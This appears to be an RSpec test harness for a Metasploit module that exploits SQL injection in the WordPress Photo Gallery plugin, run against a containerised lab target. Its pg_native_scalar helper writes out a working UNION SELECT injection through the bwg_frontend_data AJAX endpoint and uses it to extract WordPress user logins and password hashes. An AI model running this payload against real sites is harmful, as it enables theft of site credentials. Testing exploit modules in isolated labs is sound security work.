# frozen_string_literal: true

require 'base64'
require 'digest'
require 'json'
require 'net/http'
require 'open3'
require_relative 'profiles'

RSpec.shared_context 'native Photo Gallery target' do
  include_context 'module target'

  before(:all) do
    @pg_profile = PhotoGalleryProfiles.fetch
    @pg_native = { requests: [], commands: [], calls: [], reports: [], controls: [] }
    begin
      pg_counters('before')
      unless @pg_profile.fetch('mode') == 'unrelated'
        pg_verify_identity
        pg_seed_gallery unless @pg_profile.fetch('mode') == 'absent'
        @pg_baseline = pg_identity
      end
      pg_native_controls('before')
      expect(pg_sql("SELECT count(*) FROM information_schema.tables WHERE table_schema='public'").strip).to eq('0')
      endpoint = target_endpoint('reporting_db')
      expect(console_command("db_connect module_framework:module-target-framework-db-password@#{endpoint.fetch('host')}:#{endpoint.fetch('port')}/module_targets", timeout: 120)).not_to match(/\[-\]|Error|Exception/)
      expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
      output = console_command('irb -e \'puts "PHOTO_GALLERY_PROVENANCE=" + {ruby: RUBY_VERSION, config: Msf::Config.config_directory, owner_sha256: Digest::SHA256.file("modules/auxiliary/gather/wp_photo_gallery_sqli.rb").hexdigest}.to_json\'')
      @pg_native[:provenance] = JSON.parse(output.match(/^PHOTO_GALLERY_PROVENANCE=(.+)$/)[1])
      expect(@pg_native[:provenance].fetch('config')).to eq(ENV.fetch('MSF_CFGROOT_CONFIG'))
      expect(@pg_native[:provenance].fetch('owner_sha256')).to eq(Digest::SHA256.file("modules/#{PhotoGalleryProfiles::OWNER}.rb").hexdigest)
      @pg_native[:preflight] = 'passed'
    ensure
      pg_save
    end
  end

  before do |example|
    @pg_workspace = 'photo_gallery_' + example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command("workspace -a #{@pg_workspace}")).not_to include('[-]')
    expect(pg_reports).to eq([])
    console_command('back')
    expect(console_command("use #{PhotoGalleryProfiles::OWNER}")).not_to match(/Failed to load|Unknown command|No results/)
  end

  after(:all) do
    pg_native_controls('after') if @pg_native&.key?(:preflight)
    expect(console_command('irb -e \'puts "PHOTO_GALLERY_STATE=" + {sessions: framework.sessions.keys, jobs: framework.jobs.keys}.to_json\'')).to include('PHOTO_GALLERY_STATE={"sessions":[],"jobs":[]}') if @pg_native&.key?(:provenance)
  ensure
    pg_counters('after') if @pg_profile
    pg_save
  end

  def pg_prefix
    @pg_profile.fetch('prefix')
  end

  def pg_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-photo-gallery.json'), JSON.pretty_generate(@pg_native)) if @pg_native
  end

  def pg_command(role, *arguments, user: nil)
    argv = target_runtime.fetch('compose') + ['exec', '-T']
    argv += ['--user', user] if user
    argv += [role, 'timeout', '25', *arguments]
    output, error, status = Open3.capture3(*argv)
    @pg_native.fetch(:commands) << { argv: argv, stdout_base64: Base64.strict_encode64(output), stderr: error, exitstatus: status.exitstatus }
    pg_save
    raise "Native Photo Gallery command failed: #{role}: #{error}" unless status.success?

    output
  end

  def pg_identity
    JSON.parse(pg_command('app', 'php', '/opt/module-target/control.php', user: 'www-data'))
  end

  def pg_verify_identity
    identity = pg_identity
    expect(identity.values_at('core', 'php', 'uid', 'prefix', 'table_prefix')).to eq(['6.8.3', '8.3.28', 33, pg_prefix, @pg_profile.fetch('table_prefix')])
    expect(identity.fetch('db_error')).to eq('')
    expect(identity.fetch('group_concat_limit').to_i).to eq(@pg_profile.fetch('sql_limit')) if @pg_profile.key?('sql_limit')
    if @pg_profile.fetch('mode') == 'absent'
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([false, [], nil])
      expect(identity.fetch('table_counts')).to eq({})
    else
      release = PhotoGalleryProfiles::RELEASES.fetch(@pg_profile.fetch('release'))
      expect(identity.values_at('active', 'active_plugins', 'plugin_version')).to eq([true, ['photo-gallery/photo-gallery.php'], @pg_profile.fetch('release')])
      expect(identity.fetch('archive_sha256')).to eq(release.fetch('sha256'))
      expect(identity.fetch('installed_sha256')).to eq(release.fetch('installed_sha256'))
    end
    @pg_native[:identity] = identity
  end

  def pg_request(path, form: nil, headers: {})
    endpoint = target_endpoint('app')
    http = Net::HTTP.new(endpoint.fetch('host'), endpoint.fetch('port'), nil)
    http.open_timeout = 5
    http.read_timeout = 20
    request = form ? Net::HTTP::Post.new(path) : Net::HTTP::Get.new(path)
    headers.each { |key, value| request[key] = value }
    request.set_form_data(form) if form
    response = http.request(request)
    @pg_native.fetch(:requests) << { method: request.method, path: path, headers_sent: headers, body_sent_base64: request.body && Base64.strict_encode64(request.body.b), code: response.code, headers: response.to_hash, body_base64: Base64.strict_encode64(response.body.to_s.b) }
    pg_save
    response
  ensure
    http&.finish if http&.started?
  end

  def pg_seed_gallery
    created = JSON.parse(pg_command('app', 'php', '/opt/module-target/control.php', 'create-gallery', user: 'www-data'))
    expect(created.values_at('gallery_id', 'image_id', 'tag_id', 'page_id')).to all(be > 0)
    expect(created.fetch('shortcode_id')).to eq(1)
    @pg_native[:seed] = created
  end

  def pg_ajax(value = nil, shortcode: 1)
    arguments = { 'action' => 'bwg_frontend_data', 'shortcode_id' => shortcode }
    arguments['bwg_tag_id_bwg_thumbnails_0[]'] = value unless value.nil?
    pg_request("#{pg_prefix}/wp-admin/admin-ajax.php?#{URI.encode_www_form(arguments)}")
  end

  def pg_channels(response)
    document = Nokogiri::HTML(response.body, nil, 'UTF-8')
    {
      titles: document.css('div.bwg-title2').map { |node| node.text.strip },
      image_alts: document.css('img').filter_map do |node|
        node['alt'] if node['class'].to_s.split.any? { |value| value.start_with?('bwg_standart_thumb_img_') }
      end
    }
  end

  # Independent native proof: suppress normal rows and frame the eighth image
  # column. The result is read from both genuine plugin rendering channels.
  def pg_native_scalar(expression, expected:, label:, phase:, shortcode: 1)
    start = "photo_native_start_#{phase}_#{shortcode}_#{label}_"
    ending = '_photo_native_end'
    framed = "concat(0x#{start.unpack1('H*')},ifnull(concat(0x56,hex(cast((#{expression}) as binary))),0x4e),0x#{ending.unpack1('H*')})"
    columns = Array.new(23) { |index| index == 7 ? "(#{framed})" : (15_000 + index).to_s }
    response = pg_ajax(")\" AND 0 UNION SELECT #{columns.join(',')} -- -", shortcode: shortcode)
    expect(response.code).to eq('200')
    channels = pg_channels(response)
    frames = channels.values.flatten.select { |value| value.start_with?(start) && value.end_with?(ending) }.uniq
    expected_frame = start + (expected.nil? ? 'N' : 'V' + expected.b.unpack1('H*').upcase) + ending
    expect(frames).to eq(@pg_profile.fetch('mode') == 'fixed' ? [] : [expected_frame])
  end

  def pg_native_controls(phase)
    mode = @pg_profile.fetch('mode')
    if mode == 'unrelated'
      expect(pg_request('/').body).to include('module-target-http-marker')
    else
      pg_verify_identity
      expect(pg_request("#{pg_prefix}/wp-login.php").code).to eq('200')
      if mode == 'absent'
        expect(pg_ajax.code).to eq('400')
      else
        seed = @pg_native.fetch(:seed)
        expect(@pg_baseline.fetch('schema').fetch(@pg_profile.fetch('table_prefix') + 'bwg_image').length).to eq(23)
        page = pg_request(pg_prefix + seed.fetch('page_path'))
        expect(page.code).to eq('200')
        expect(pg_channels(page).fetch(:titles)).to include('Module native café photo')
        @pg_baseline.fetch('assets').each do |name, asset|
          response = pg_request(URI.parse(@pg_baseline.fetch('upload_url')).path + name)
          expect(response.code).to eq('200')
          expect(response.body.b.bytesize).to eq(asset.fetch('size'))
          expect(Digest::SHA256.hexdigest(response.body.b)).to eq(asset.fetch('sha256'))
          expect(asset.fetch('dimensions')).to eq([20, 20])
        end
        [1, 42, 43].each do |shortcode|
          response = pg_ajax(shortcode: shortcode)
          expect(response.code).to eq('200')
          expect(pg_channels(response)).to eq(titles: shortcode == 43 ? [] : ['Module native café photo'], image_alts: ['Module native café photo'])
        end
        matching = pg_ajax(seed.fetch('tag_id'))
        expect(matching.code).to eq('200')
        expect(pg_channels(matching).fetch(:titles)).to eq(['Module native café photo'])
        [pg_ajax(999_999), pg_ajax(shortcode: 999_999)].each do |response|
          expect(response.code).to eq('200')
          expect(pg_channels(response)).to eq(titles: [], image_alts: [])
        end
        [1, 42, 43].each do |shortcode|
          pg_native_scalar('database()', expected: @pg_baseline.fetch('database'), label: 'database', phase: phase, shortcode: shortcode)
          pg_native_scalar('select NULL', expected: nil, label: 'null', phase: phase, shortcode: shortcode)
          pg_native_scalar('repeat(0x61,0)', expected: '', label: 'empty', phase: phase, shortcode: shortcode)
        end
        @pg_baseline.fetch('users').each do |user|
          expression = 'select hex(concat_ws(0x3b,user_login,user_pass)) from ' + @pg_profile.fetch('table_prefix') + 'users where ID=' + Integer(user.fetch('ID'), 10).to_s
          pg_native_scalar(expression, expected: user.values_at('user_login', 'user_pass').join(';').b.unpack1('H*').upcase, label: 'user_' + user.fetch('ID'), phase: phase)
        end
        expect(pg_channels(pg_ajax).fetch(:titles)).to eq(['Module native café photo'])
      end
      pg_unchanged
    end
    @pg_native.fetch(:controls) << { phase: phase, mode: mode, status: 'passed' }
    pg_save
  end

  def pg_unchanged
    stable = %w[core php uid prefix active active_plugins plugin_version archive_sha256 installed_sha256 table_prefix database schema users assets galleries images image_tags shortcodes tags pages]
    expect(pg_identity.slice(*stable)).to eq(@pg_baseline.slice(*stable))
  end

  def pg_sql(query)
    pg_command('reporting_db', 'env', 'PGPASSWORD=module-target-framework-db-password', 'psql', '-h', '127.0.0.1', '-U', 'module_framework', '-d', 'module_targets', '-v', 'ON_ERROR_STOP=1', '-Atc', query)
  end

  def pg_reports
    raise ArgumentError, 'Invalid Photo Gallery workspace' unless @pg_workspace.match?(/\Aphoto_gallery_[0-9_]+\z/)

    rows = JSON.parse(pg_sql(<<~SQL))
      SELECT coalesce(json_agg(row ORDER BY row.username),'[]'::json) FROM (
        SELECT p.username,s.data AS private_data,s.type,s.jtr_format,c.origin_type,o.module_full_name,
          service.name AS service,service.port,service.proto,host(h.address::inet) AS address
        FROM metasploit_credential_cores c JOIN workspaces w ON w.id=c.workspace_id
        LEFT JOIN metasploit_credential_publics p ON p.id=c.public_id LEFT JOIN metasploit_credential_privates s ON s.id=c.private_id
        LEFT JOIN metasploit_credential_origin_services o ON o.id=c.origin_id AND c.origin_type='Metasploit::Credential::Origin::Service'
        LEFT JOIN services service ON service.id=o.service_id LEFT JOIN hosts h ON h.id=service.host_id
        WHERE w.name='#{@pg_workspace}'
      ) row
    SQL
    @pg_native.fetch(:reports) << { workspace: @pg_workspace, rows: rows }
    pg_save
    rows
  end

  def pg_owner(options = {}, action: 'run', service: 'app')
    endpoint = target_endpoint(service)
    values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'SSL' => false, 'TARGETURI' => pg_prefix.empty? ? '/' : pg_prefix + '/', 'VERBOSE' => true, 'HttpClientTimeout' => 5 }.merge(options)
    @pg_native.fetch(:calls) << { workspace: @pg_workspace, action: action, service: service, options: values, state: 'started' }
    pg_save
    output = console_command("#{action} #{format_datastore_options(values)}", timeout: 90)
    @pg_native.fetch(:calls).last.merge!(state: 'returned', output_base64: Base64.strict_encode64(output.b))
    pg_save
    expect(output).not_to match(/Exception|undefined method|Unknown command|Msf::OptionValidateError|LocalJumpError|unexpected return/)
    expect(output).to include('Auxiliary module execution completed') if action == 'run'
    output
  end

  def pg_success(options = {}, count:)
    output = pg_owner(options)
    expect(output).not_to match(/Auxiliary (?:failed|aborted)/)
    expect(output).to include('Loot saved to:')
    users = @pg_baseline.fetch('users').to_h { |user| user.values_at('user_login', 'user_pass') }
    records = pg_reports
    expect(records.length).to eq(count.zero? ? users.length : [count, users.length].min)
    records.each do |row|
      expect(row.fetch('private_data')).to eq(users.fetch(row.fetch('username')))
      expect(output).to include(row.fetch('username'), row.fetch('private_data'))
      endpoint = target_endpoint('app')
      expect(row.values_at('type', 'origin_type', 'module_full_name', 'proto', 'address', 'port')).to eq(['Metasploit::Credential::NonreplayableHash', 'Metasploit::Credential::Origin::Service', PhotoGalleryProfiles::OWNER, 'tcp', endpoint.fetch('host'), endpoint.fetch('port')])
    end
    loot = output.match(/Loot saved to: (.+)$/)
    expect(loot).not_to be_nil
    path = File.expand_path(loot[1].strip)
    expect(path).to start_with(File.expand_path(ENV.fetch('MSF_CFGROOT_CONFIG')) + '/')
    expected = records.map { |row| "Username: #{row.fetch('username')}, Password Hash: #{row.fetch('private_data')}" }
    expect(File.readlines(path, chomp: true)).to match_array(expected)
    @pg_native.fetch(:reports) << { workspace: @pg_workspace, loot: path, sha256: Digest::SHA256.file(path).hexdigest }
    pg_unchanged
    pg_save
    output
  end

  def pg_refusal(options = {}, action: 'run', service: 'app')
    before = pg_reports
    output = pg_owner(options, action: action, service: service)
    expect(output).not_to include('Loot saved to:')
    expect(pg_reports).to eq(before)
    pg_unchanged if @pg_baseline
    output
  end

  def pg_counters(phase)
    roles = @pg_profile.fetch('mode') == 'unrelated' ? %w[app reporting_db] : %w[app db reporting_db]
    values = roles.to_h do |role|
      counters = %w[memory.events pids.events].to_h do |name|
        numbers = target_exec(role, 'cat', "/sys/fs/cgroup/#{name}").lines.to_h do |line|
          key, value = line.split
          [key, Integer(value, 10)]
        end
        [name, numbers]
      end
      [role, counters]
    end
    File.write(File.join(target_runtime.fetch('artifacts'), "photo-gallery-resources-#{phase}.json"), JSON.pretty_generate(values))
    values.each_value do |counters|
      expect(counters.fetch('memory.events').values_at('oom', 'oom_kill')).to eq([0, 0])
      expect(counters.fetch('pids.events').fetch('max')).to eq(0)
    end
  end
end
